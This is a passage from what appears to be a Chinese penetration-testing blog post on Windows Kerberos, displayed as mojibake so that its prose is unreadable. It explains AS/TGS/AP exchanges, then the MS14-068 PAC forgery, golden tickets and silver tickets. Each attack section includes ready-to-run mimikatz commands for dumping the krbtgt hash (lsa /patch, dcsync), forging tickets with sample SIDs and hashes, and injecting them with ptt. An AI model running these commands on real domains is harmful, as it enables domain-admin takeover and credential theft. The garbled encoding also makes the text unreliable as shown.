<p>ä½†æ˜¯ç½‘ç»œä¸­ï¼Œå¯†æ–‡å’Œæ–‡å­—å¾ˆæœ‰å¯èƒ½è¢«çªƒå–ï¼Œå¹¶ä¸”åªè¦æ—¶é—´è¶³å¤Ÿï¼Œæ€»èƒ½ç ´è§£å¾—åˆ°ç§˜é’¥ã€‚æ‰€ä»¥ä¸èƒ½ä½¿ç”¨è¿™ç§é•¿æœŸæœ‰æ•ˆçš„ç§˜é’¥ï¼Œè¦æ”¹ä¸ºçŸ­æœŸçš„ä¸´æ—¶ç§˜é’¥ã€‚é‚£ä¹ˆè¿™ä¸ªä¸´æ—¶ç§˜é’¥å°±éœ€è¦ä¸€ä¸ªç¬¬ä¸‰æ–¹å¯ä¿¡ä»»çš„æœºæ„æ¥æä¾›ï¼Œå³KDCï¼ˆKey Distribution Centerï¼‰ã€‚</p>
<p>ä¸‹é¢è®²ä¸€ä¸‹è¯¦ç»†çš„è®¤è¯æ­¥éª¤ï¼Œå¤§æ¦‚åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š</p>
<p><strong>AS-REQâ€”AS-REPé˜¶æ®µï¼š</strong></p>
<p>é¦–å…ˆClientç”¨è‡ªå·±çš„å“ˆå¸Œå€¼NTLM-hashå¯¹timestampã€client-infoã€server-infoç­‰æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå‘é€ç»™ASï¼Œå‘ASè¯·æ±‚TGTç¥¨æ®ã€‚ï¼ˆ<strong>AS-REQ</strong>ï¼‰</p>
<p>å½“ASæ”¶åˆ°Clientå‘æ¥çš„ä¿¡æ¯åï¼ŒASä¼šå…ˆå‘åŸŸæ§ADè¯·æ±‚ï¼Œè¯¢é—®æ˜¯å¦æœ‰æ­¤Clientç”¨æˆ·ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±ä¼šå–å‡ºè¯¥Clientçš„NTLM hashï¼Œç„¶åç”Ÿæˆä¸€ä¸ªéšæœºç§˜é’¥ç§°ä¸ºSession-Key asï¼ˆä¸´æ—¶ç§˜é’¥Session-Keyï¼‰ã€‚å¹¶ä½¿ç”¨Client NTLM-hash åŠ å¯† Session-key as ä½œä¸ºä¸€éƒ¨åˆ†å†…å®¹ã€‚</p>
<p>è¿˜æœ‰ä¸€éƒ¨åˆ†å†…å®¹å°±æ˜¯TGTï¼šä½¿ç”¨KDCä¸€ä¸ªç‰¹å®šè´¦æˆ·krbtgtçš„NTLM-hashå¯¹Session-key asã€timestampã€Client-infoè¿›è¡Œçš„åŠ å¯†ã€‚ç„¶åå°†è¿™ä¸¤éƒ¨åˆ†å›å¤ç»™Clientã€‚ï¼ˆ<strong>AS-REP</strong>ï¼‰</p>
<p>è¯¥é˜¶æ®µæ˜¯Clientå’ŒASçš„è®¤è¯ã€‚</p>
<p><strong>TGS-REQâ€”TGS-REPé˜¶æ®µï¼š</strong></p>
<p>Client æ”¶åˆ°ASå‘æ¥çš„AS-REPåï¼Œå…ˆä½¿ç”¨è‡ªèº«çš„ NTLM Hash è§£å¯†å¾—åˆ° Session-key asï¼Œç„¶åä½¿ç”¨ Session-key as å¯¹ Client-Infoã€timestampã€Server-Info åŠ å¯†ä½œä¸ºä¸€éƒ¨åˆ†ï¼ŒåŠ ä¸ŠTGT ï¼Œä¸€å¹¶å‘é€ç»™ KDCä¸­çš„ TGSã€‚ï¼ˆ<strong>TGS-REQ</strong>ï¼‰</p>
<p>TGS æ”¶åˆ°è¯·æ±‚åï¼Œä½¿ç”¨ krbtgt çš„ NTLM Hash è§£å¯† TGTï¼Œå¾—åˆ° Session-key  asã€timestampã€Client-infoï¼ŒåŒæ—¶ï¼Œä½¿ç”¨ TGT è§£å¯†å‡ºçš„ Session-key as  è§£å¯†ç¬¬ä¸€éƒ¨åˆ†å†…å®¹ï¼Œå¾—åˆ°Client-infoã€timestampã€‚  æ¯”å¯¹è¿™ä¸¤éƒ¨åˆ†è§£å¯†å¾—åˆ°çš„å†…å®¹ä»¥éªŒè¯æ˜¯å¦é€šè¿‡ã€‚é€šè¿‡åï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„éšæœºç§˜é’¥(Session-Key tgs)ï¼Œå¹¶å‘Clientå›å¤<strong>TGS-REPçš„</strong>ä¸¤éƒ¨åˆ†å†…å®¹ï¼š</p>
<ol>
<li>ä¸€éƒ¨åˆ†æ˜¯Session-key as åŠ å¯†çš„ Session-key tgs</li>
<li>å¦ä¸€éƒ¨åˆ†æ˜¯ST(ticket)ï¼Œå³Server NTLM-hashåŠ å¯†çš„æ•°æ®(Session-key tgsã€timestampã€Client-info)</li>
</ol>
<p>è¯¥é˜¶æ®µæ˜¯Clientå’ŒKDCçš„é€šä¿¡ã€‚</p>
<p><strong>AP-REQâ€”AP-REPé˜¶æ®µï¼š</strong></p>
<p>Clientæ”¶åˆ°<strong>TGS-REPå</strong>ï¼Œå…ˆç”¨è‡ªå·±ä¿å­˜çš„Session-key asè§£å¯†å‡ºäº†Session-key tgsã€‚å†ä½¿ç”¨Session-key tgsåŠ å¯†Client-infoã€timestampä½œä¸ºä¸€éƒ¨åˆ†å†…å®¹ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯STï¼Œä¸€å¹¶å‘é€ç»™Serverã€‚ï¼ˆ<strong>AP-REQ</strong>ï¼‰</p>
<p>Server æ”¶åˆ°Clientå‘æ¥çš„<strong>AP-REQ</strong>åï¼Œç”¨è‡ªèº«çš„NTLM Hashè§£å¯†äº†STï¼Œå¾—åˆ°Session-key tgsï¼Œå†ç”¨Session-key  tgsè§£å¯†ç¬¬ä¸€éƒ¨åˆ†å¾—åˆ°Client-infoã€timestampã€‚ç„¶åä¸STçš„Client-infoã€timestampè¿›è¡Œå¯¹æ¯”ã€‚timestamp ä¸€èˆ¬æ—¶é—´ä¸º8å°æ—¶ã€‚éªŒè¯é€šè¿‡åï¼Œå›å¤<strong>AP-REP</strong>ï¼Œæœ€ç»ˆå»ºç«‹é€šä¿¡ã€‚</p>
<p>ä¸Šé¢çš„PTHæ”»å‡»ï¼Œéœ€è¦è·å–åˆ°NTLMï¼Œå¿…é¡»è¦è·å¾—ç›®æ ‡çš„ç®¡ç†å‘˜æƒé™ï¼Œå¦‚æœæ²¡æœ‰ç®¡ç†å‘˜æƒé™ä¸‹ï¼Œè¦ä¹ˆææƒï¼Œè¦ä¹ˆå¯ä»¥è¯•ä¸€è¯•PTT</p>
<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>PACæ˜¯ç”¨æ¥éªŒè¯Clientçš„è®¿é—®æƒé™çš„ï¼Œå®ƒä¼šè¢«æ”¾åœ¨TGTé‡Œå‘é€ç»™Clientï¼Œç„¶åç”±Clientå‘é€ç»™TGSã€‚</p>
<p>WindowsåŸŸä¸­ä½¿ç”¨kerberosåè®®è¿‡ç¨‹ä¸­ï¼Œä¸ºäº†è®©æœåŠ¡å™¨åˆ¤æ–­Clientæ˜¯å¦æœ‰æƒé™è®¿é—®æœåŠ¡ï¼Œå¾®è½¯åœ¨Windowså¹³å°ä¸Šå¯¹Kerberosåè®®è¿›è¡Œäº†ä¸€äº›æ‰©å……ï¼Œå³åœ¨åè®®ä¸­å¢åŠ äº†PACï¼ˆPrivilege Attribute Certificateï¼‰ï¼Œç‰¹æƒå±æ€§è¯ä¹¦ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªPACé€ æˆäº†MS14-068è¿™ä¸ªæ¼æ´ã€‚</p>
<p>MS14-068æ˜¯å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKDCï¼‰æœåŠ¡ä¸­çš„Windowsæ¼æ´ã€‚å®ƒå…è®¸ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·åœ¨å…¶Kerberosç¥¨è¯ï¼ˆTGTï¼‰ä¸­<strong>æ’å…¥ä»»æ„çš„PAC</strong>ï¼ˆè¡¨ç¤ºæ‰€æœ‰ç”¨æˆ·æƒé™çš„ç»“æ„ï¼‰ã€‚è¯¥æ¼æ´ä½äºkdcsvc.dllåŸŸæ§åˆ¶å™¨çš„å¯†é’¥åˆ†å‘ä¸­å¿ƒ(KDC)ä¸­ã€‚<strong>æ™®é€šç”¨æˆ·å¯ä»¥é€šè¿‡å‘ˆç°å…·æœ‰æ”¹å˜äº†PACçš„Kerberos TGTæ¥è·å¾—ç¥¨è¯ï¼Œè¿›è€Œä¼ªé€ ç¥¨æ®è·å¾—ç®¡ç†å‘˜æƒé™ã€‚</strong></p>
<p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p>
<blockquote>
<p>è·å–ä»»æ„ç”¨æˆ·SID</p>
<p>åŸŸå†…ä»»æ„è´¦å·çš„å¯†ç </p>
</blockquote>
<p><strong>åˆ©ç”¨ï¼š</strong></p>
<p>æ‰¾åˆ©ç”¨å·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p>
<p>ç”ŸæˆTGT(ccache)</p>
<blockquote>
<p>MS14-068 -u <a href="mailto:&#116;&#x65;&#x73;&#116;&#64;&#81;&#x57;&#x45;&#46;&#105;&#x6f;">&#116;&#x65;&#x73;&#116;&#64;&#81;&#x57;&#x45;&#46;&#105;&#x6f;</a> -s S-1-5-21-264158955-2367710963-2250079592-1105 -d DC.QWE.io -p p@ssword123.</p>
</blockquote>
<p>mimikatzæ³¨å…¥ç¥¨æ®</p>
<blockquote>
<p>kerberos::purge  //æ¸…ç©ºæ‰€æœ‰å‡­è¯ï¼Œæœ‰å…¶ä»–å‡­è¯ä¼šå½±å“ä¼ªé€ </p>
<p>kerberos::list       //åˆ—å‡ºæ‰€æœ‰å‡­è¯</p>
<p>kerberos::ptc       //æ³¨å…¥ç¥¨æ®</p>
</blockquote>
<blockquote>
<p>net use \\DC        â€¦</p>
</blockquote>
<h3 id="é»„é‡‘ç¥¨æ®-Golden-ticket"><a href="#é»„é‡‘ç¥¨æ®-Golden-ticket" class="headerlink" title="é»„é‡‘ç¥¨æ®(Golden ticket)"></a>é»„é‡‘ç¥¨æ®(Golden ticket)</h3><p>åœ¨Windowsçš„kerberosè®¤è¯è¿‡ç¨‹ä¸­ï¼ŒClientå°†è‡ªå·±çš„ä¿¡æ¯å‘é€ç»™KDCï¼Œç„¶åKDCä½¿ç”¨krbtgtç”¨æˆ·çš„Hashä½œä¸ºå¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œç”ŸæˆTGTã€‚é‚£ä¹ˆå¦‚æœè·å–åˆ°äº†krbtgtçš„Hashå€¼ï¼Œä¸å°±å¯ä»¥ä¼ªé€ ä»»æ„çš„tgtäº†å—ã€‚<strong>å› ä¸ºkrbtgtåªæœ‰åŸŸæ§åˆ¶å™¨ä¸Šé¢æ‰æœ‰ï¼Œæ‰€ä»¥ä½¿ç”¨é»„é‡‘å‡­æ®æ„å‘³ç€ä½ ä¹‹å‰æ‹¿åˆ°è¿‡åŸŸæ§åˆ¶å™¨çš„æƒé™ï¼Œé»„é‡‘å‡­æ®å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªåé—¨ã€‚</strong></p>
<blockquote>
<p>å…ˆå‡è®¾è¿™ä¹ˆä¸€ç§æƒ…å†µï¼ŒåŸå…ˆå·²æ‹¿åˆ°çš„åŸŸå†…æ‰€æœ‰çš„è´¦æˆ·Hashï¼ŒåŒ…æ‹¬krbtgtè¿™ä¸ªè´¦æˆ·ï¼Œç”±äºæœ‰äº›åŸå› å¯¼è‡´ä½ å¯¹åŸŸç®¡æƒé™ä¸¢å¤±ï¼Œä½†å¥½åœ¨ä½ è¿˜æœ‰ä¸€ä¸ªæ™®é€šåŸŸç”¨æˆ·æƒé™ï¼Œç¢°å·§ç®¡ç†å‘˜åœ¨åŸŸå†…åŠ å›ºæ—¶å¿˜è®°é‡ç½®krbtgtå¯†ç ï¼ŒåŸºäºæ­¤æ¡ä»¶ï¼Œæˆ‘ä»¬è¿˜èƒ½åˆ©ç”¨è¯¥ç¥¨æ®é‡æ–°è·å¾—åŸŸç®¡ç†å‘˜æƒé™ï¼Œ<strong>åˆ©ç”¨krbtgtçš„HASHå€¼å¯ä»¥ä¼ªé€ ç”Ÿæˆä»»æ„çš„TGT(mimikatz)ï¼Œèƒ½å¤Ÿç»•è¿‡å¯¹ä»»æ„ç”¨æˆ·çš„è´¦å·ç­–ç•¥ï¼Œè®©ç”¨æˆ·æˆä¸ºä»»æ„ç»„çš„æˆå‘˜ï¼Œå¯ç”¨äºKerberosè®¤è¯çš„ä»»ä½•æœåŠ¡</strong>ã€‚</p>
</blockquote>
<p>æ”»å‡»è€…å†ä½¿ç”¨é»„é‡‘ç¥¨æ®è¿›è¡Œç¥¨æ®ä¼ é€’æ”»å‡»æ—¶ï¼Œé€šå¸¸è¦æŒæ¡ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>éœ€è¦ä¼ªé€ çš„åŸŸç®¡ç†å‘˜ç”¨æˆ·å</li>
<li>å®Œæ•´çš„åŸŸå</li>
<li>åŸŸSID</li>
<li>krbtgtçš„NTLM Hash</li>
</ul>
<p><strong>åˆ©ç”¨ï¼š</strong></p>
<p>ç™»å½•åŸŸæ§æŠ“å–krbtgtç”¨æˆ·çš„Hashå€¼å¹¶è·å–åŸŸSID</p>
<p><strong>ç»æµ‹è¯•ï¼Œwin10/server2022æŠ“å–ä¼šå…³æœºï¼Œå·²åœ¨æ­¤è®¾å¤‡ä¸Šç¦ç”¨å¯¹åŠ¨æ€è®¿é—®æ§åˆ¶çš„Kerberos æ”¯æŒ</strong></p>
<blockquote>
<p>privilege::debug</p>
<p>lsadump::lsa /patch        // ä¸“ç”¨äºåœ¨åŸŸæ§åˆ¶å™¨ä¸Šå¯¼å‡ºç”¨æˆ·å¯†ç æˆ–hash</p>
<p>æˆ–è€…ï¼š</p>
<p>lsadump::dcsync /domain:QWE.io /user:krbtgt  //å–å¾—çš„sidå€¼åé¢ä¸‰ä½å»é™¤</p>
</blockquote>
<ul>
<li>ç”Ÿæˆç¥¨æ®åæ³¨å…¥</li>
</ul>
<p>ç„¶ååœ¨æ™®é€šåŸŸç”¨æˆ·æœºå™¨ï¼Œç”¨mimikatzç”Ÿæˆåä¸ºticket.kirbiçš„TGTå‡­è¯ï¼Œç”¨æˆ·åä¸ºAdministrator </p>
<blockquote>
<p>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-979886063-1111900045-1414766810 /krbtgt:7c4ed692473d4b4344c3ba01c5e6cb63 /ticket:ticket.kirbi</p>
</blockquote>
<p>æ³¨å…¥TGTç¥¨æ®</p>
<blockquote>
<p>kerberos::ptt ticket.kirbi</p>
</blockquote>
<p>æŸ¥çœ‹tgt</p>
<blockquote>
<p>kerberos::tgt</p>
</blockquote>
<blockquote>
<p>net use \\DC        â€¦</p>
</blockquote>
<ul>
<li>ç”Ÿæˆå¹¶ç›´æ¥å¯¼å…¥</li>
</ul>
<blockquote>
<p>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /krbtgt:7aad81625fab43e7fdb3cd9f399c060c /ptt  //ç”Ÿæˆç¥¨æ®å¹¶å¯¼å…¥</p>
<p>æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨krbtgtçš„AES-256<br>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /aes256:93c335cce03858c917fa2ea98ca79f0b791c93c33ab17936784548114648cda7  /ptt</p>
</blockquote>
<h3 id="ç™½é“¶ç¥¨æ®-Silver-ticket"><a href="#ç™½é“¶ç¥¨æ®-Silver-ticket" class="headerlink" title="ç™½é“¶ç¥¨æ®(Silver ticket)"></a>ç™½é“¶ç¥¨æ®(Silver ticket)</h3><p>ç™½é“¶ç¥¨æ®ä¸åŒäºé»„é‡‘ç¥¨æ®ï¼Œç™½é“¶ç¥¨æ®çš„åˆ©ç”¨è¿‡ç¨‹æ˜¯ä¼ªé€ TGSï¼Œé€šè¿‡å·²çŸ¥çš„æˆæƒæœåŠ¡å¯†ç ç”Ÿæˆä¸€å¼ å¯ä»¥è®¿é—®è¯¥æœåŠ¡çš„TGTã€‚å› ä¸ºåœ¨ç¥¨æ®ç”Ÿæˆè¿‡ç¨‹ä¸­ä¸éœ€è¦ä½¿ç”¨KDCï¼Œæ‰€ä»¥å¯ä»¥ç»•è¿‡åŸŸæ§åˆ¶å™¨ï¼Œå¾ˆå°‘ç•™ä¸‹æ—¥å¿—ã€‚è€Œé»„é‡‘ç¥¨æ®åœ¨åˆ©ç”¨è¿‡ç¨‹ä¸­ç”±KDCé¢å‘TGTï¼Œå¹¶ä¸”åœ¨ç”Ÿæˆä¼ªé€ çš„TGTå¾—20åˆ†é’Ÿå†…ï¼ŒTGSä¸ä¼šå¯¹è¯¥TGTçš„çœŸä¼ªè¿›è¡Œæ•ˆéªŒã€‚</p>
<p>ç™½é“¶ç¥¨æ®ä¾èµ–äºæœåŠ¡è´¦å·çš„å¯†ç æ•£åˆ—å€¼ï¼Œè¿™ä¸åŒäºé»„é‡‘ç¥¨æ®åˆ©ç”¨éœ€è¦ä½¿ç”¨krbtgtè´¦å·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œå› æ­¤æ›´åŠ éšè”½ã€‚</p>
<p>æ”»å‡»è€…è¦åˆ©ç”¨ç™½é“¶ç¥¨æ®è¿›è¡Œç¥¨æ®ä¼ é€’æ”»å‡»ï¼Œéœ€è¦æŒæ¡ä¸‹é¢å‡ ä¸ªä¿¡æ¯ï¼š</p>
<ul>
<li>åŸŸå</li>
<li>åŸŸSID</li>
<li>ç›®æ ‡æœåŠ¡å™¨çš„FQDN</li>
<li>å¯åˆ©ç”¨çš„æœåŠ¡</li>
<li>æœåŠ¡è´¦å·çš„NTLM Hash</li>
<li>è¦ä¼ªé€ çš„ç”¨æˆ·å</li>
</ul>
<p><strong>åˆ©ç”¨ï¼š</strong></p>
<p>ç™»å½•åŸŸæ§ï¼ŒæŠ“å–å…±äº«æœåŠ¡è´¦å·hash</p>
<blockquote>
<p>privilege::debug</p>
<p>sekurlsa::logonpasswords</p>
</blockquote>
<p>åœ¨æ™®é€šåŸŸç”¨æˆ·ä¸­ï¼Œç”Ÿæˆç™½é“¶ç¥¨æ®</p>
<blockquote>
<p>kerberos::golden /domain:QWE.io /sid:SID /target:DC.QWE.io /rc4:hash /service:cifs /user:admin /ptt</p>
</blockquote>
<p>å…¶ä¸­</p>
<blockquote>
<p>/service:ç›®æ ‡æœåŠ¡å™¨ä¸Šé¢çš„kerberosæœåŠ¡ï¼Œæ­¤å¤„ä¸ºcifs</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">æœåŠ¡åç§°                    åŒæ—¶éœ€è¦çš„æœåŠ¡<br><span class="hljs-variable">WMI</span>                        <span class="hljs-variable">HOST</span>ã€<span class="hljs-variable">RPCSS</span><br><span class="hljs-variable">PowerShell</span> <span class="hljs-variable">Remoting</span>        <span class="hljs-variable">HOST</span>ã€<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">WinRM</span>                      <span class="hljs-variable">HOST</span>ã€<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">Scheduled</span> <span class="hljs-built_in">Tasks</span>            <span class="hljs-variable">HOST</span><br><span class="hljs-variable">Windows</span> <span class="hljs-built_in">File</span> <span class="hljs-built_in">Share</span>         <span class="hljs-variable">CIFS</span><br><span class="hljs-variable">LDAP</span>                       <span class="hljs-variable">LDAP</span><br><span class="hljs-variable">Windows</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Server</span>      <span class="hljs-variable">RPCSS</span>ã€<span class="hljs-variable">LDAP</span>ã€<span class="hljs-variable">CIFS</span><br></code></pre></td></tr></table></figure>

<p>/rc4:åŸŸæ§çš„è®¡ç®—æœºè´¦æˆ·ntlm hash</p>
<p>/user:è¦ä¼ªé€ çš„ç”¨æˆ·å(<strong>ä»»æ„ï¼åŒ…æ‹¬ä¸å­˜åœ¨çš„ç”¨æˆ·</strong>)</p>
<p>mimikatz.exe â€œkerberos::golden /domain:åŸŸ /sid:SID /target:åŸŸå…¨ç§° /service:è¦è®¿é—®çš„æœåŠ¡ /rc4:NTLM /user:silver /pttâ€å³å¯ç”Ÿæˆå¹¶å¯¼å…¥Silver Ticket</p>
</blockquote>
<h3 id="é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸åŒ"><a href="#é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸åŒ" class="headerlink" title="é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸åŒ"></a>é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸åŒ</h3><p>è®¿é—®æƒé™ä¸åŒï¼š</p>
<ul>
<li>é»„é‡‘ç¥¨æ®Golden Ticketï¼šä¼ªé€ TGTï¼Œå¯ä»¥è·å–ä»»ä½•KerberosæœåŠ¡æƒé™</li>
<li>ç™½é“¶ç¥¨æ®Silver Ticketï¼šä¼ªé€ TGSï¼Œåªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡</li>
</ul>
<p>åŠ å¯†æ–¹å¼ä¸åŒï¼š</p>
<ul>
<li>Golden Ticketç”±krbtgtçš„HashåŠ å¯†</li>
<li>Silver Ticket ç”±æœåŠ¡è´¦å·ï¼ˆé€šå¸¸ä¸ºè®¡ç®—æœºè´¦æˆ·ï¼‰HashåŠ å¯†</li>
<li>è®¤è¯æµç¨‹ä¸åŒï¼š</li>
<li>Golden Ticketçš„åˆ©ç”¨è¿‡ç¨‹éœ€è¦è®¿é—®åŸŸæ§ï¼Œ</li>
<li>è€ŒSilver Ticketä¸éœ€è¦</li>
</ul>
<p>éšè”½æ€§ä¸åŒï¼š</p>
<ul>
<li>ç™½é“¶ç¥¨æ®ä¾èµ–äºæœåŠ¡è´¦å·çš„å¯†ç æ•£åˆ—å€¼ï¼Œè€Œé»„é‡‘ç¥¨æ®éœ€è¦åˆ©ç”¨krbtgtè´¦å·çš„å¯†ç æ•£åˆ—å€¼ï¼Œå› æ­¤ç™½é“¶ç¥¨æ®æ›´éšè”½</li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/network/">network</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/04/11/%E5%88%9D%E6%8E%A2Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">åˆæ¢Dockerå®¹å™¨é€ƒé€¸</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/03/27/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
                        <span class="hidden-mobile">æƒé™æå‡</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"è¯´ç‚¹ä»€ä¹ˆ","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">è½½å…¥å¤©æ•°...</span> <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ä¸è’œå­ç»Ÿè®¡PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            æ€»è®¿é—®é‡ 
            <span id="busuanzi_value_site_pv"></span>
             æ¬¡
          </span>
      
      
        <!-- ä¸è’œå­ç»Ÿè®¡UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            æ€»è®¿å®¢æ•° 
            <span id="busuanzi_value_site_uv"></span>
             äºº
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>


</body>
</html>
